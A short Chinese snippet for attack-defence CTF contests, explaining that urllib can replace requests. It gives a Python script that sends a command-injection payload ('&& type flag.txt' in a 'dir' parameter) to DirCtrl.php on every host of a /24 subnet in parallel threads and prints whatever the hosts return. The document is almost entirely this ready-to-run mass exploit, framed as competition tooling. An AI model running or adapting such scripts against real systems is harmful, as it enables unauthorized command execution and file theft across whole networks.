使用urlilb模块

在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替

import urllib.parse
import urllib.request
import threading

def WebShell(i):
    data = {"dir": "&& type flag.txt"}
    url = "http://192.168.123."+str(i)+"/DirCtrl.php"
    data_string=urllib.parse.urlencode(data)
    new_url=url+"?"+data_string
    try:
        send = urllib.request.urlopen(new_url,timeout=1)
        print(send.read().decode("utf8","ignore"))
    except:
        pass
for i in range(1,255):
    t = threading.Thread(target=WebShell, args=(i, ))
    t.start()
